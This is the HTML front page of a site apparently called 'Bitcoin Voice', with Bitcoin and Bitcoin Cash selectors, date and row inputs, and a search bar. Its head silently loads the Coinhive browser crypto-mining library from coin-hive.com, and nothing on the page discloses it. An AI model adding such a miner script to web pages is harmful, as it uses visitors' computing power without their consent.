<!DOCTYPE html>
<head>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script src="/js.js"></script>
<link   rel="stylesheet"    type="text/css"     href="/css.css"/>
<link   rel="shortcut icon" type="image/x-icon" href="/webfavicon.ico"/>
<title>Bitcoin Voice</title>
</head>

<body onload="setupPage();">
<h1 id="title">Bitcoin Voice</h1>
<h2 id="tagline">
<table class="center" style="width:100%">
  <tr>
    <td id="bch" class="coin" onclick="selectCoin('bch', event=true)">Bitcoin Cash</td> 
    <td id="btc" class="coin" onclick="selectCoin('btc', event=true)">Bitcoin</td>
  </tr>
</table>
<table class="center" style="width:90%">
  <tr>
    <td><label class="inputLabel">Rows:&nbsp;</label><input onblur="populateLabels()" id="rowsCount" type="number"><input type="button" class="smallButton" style="float:left" value="Clear" onclick="setupPage()"></td>
  </tr>
  <tr>
    <td><label class="inputLabel">Time Period:&nbsp;</label><input type="date" id="startDate" onblur="populateLabels()"> <label class="inputLabel">&nbsp;->&nbsp;</label> <input type="date" id="endDate" onblur="populateLabels()"></td>
  </tr>
</table>
<input type="text" id="searchBar" onenter="populateLabels()" onblur="populateLabels()">
<br><br>
<table class="center" id="labelTable"></table><br>
<button onclick="populateLabels(extend=true)" class="smallButton">Show more results</button>
</body>
